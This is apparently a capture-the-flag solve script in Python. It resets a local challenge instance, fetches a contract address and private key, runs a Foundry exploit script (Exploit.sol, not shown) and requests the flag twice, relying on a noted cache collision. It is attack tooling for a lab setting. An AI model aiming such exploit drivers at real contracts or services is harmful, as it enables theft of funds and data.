# This is the script for our test instance; some modification might be needed
import requests
import os
import time

TOKEN = "a"
HOST = "http://localhost:8000"

sess = requests.Session()
sess.get(HOST + "/reset/" + TOKEN)
sess.post(HOST + "/rpc/" + TOKEN)

level_address = None
while True:
    r = sess.get(HOST + "/contract_address/" + TOKEN).json()
    if "message" in r:
        level_address = r["message"]["router_contract_address"]
        user_private_key = r["message"]["user_private_key"]
        break
    time.sleep(0.1)

print("Level address:", level_address)
print("User private key:", user_private_key)
os.putenv("ETH_RPC_URL", HOST + "/rpc/" + TOKEN)
os.system(
    " ".join(
        [
            "forge",
            "script",
            "--private-key=" + user_private_key,
            "--broadcast",
            # "-vvvv",
            "--fork-url=$ETH_RPC_URL",
            "script/Exploit.sol:Exploit",
            "--sig",
            "'run(address)'",
            level_address,
        ]
    )
)

# 1st one does not/may not use cache (async start 1 (cache check, no cache) -> async start 2 (no cache as well) -> async done (cache written) x 2)
r = sess.get(HOST + "/flag/" + TOKEN)
print(r.text)

# 2nd one will use cache, leading to utf8 collision
r = sess.get(HOST + "/flag/" + TOKEN)
print(r.text)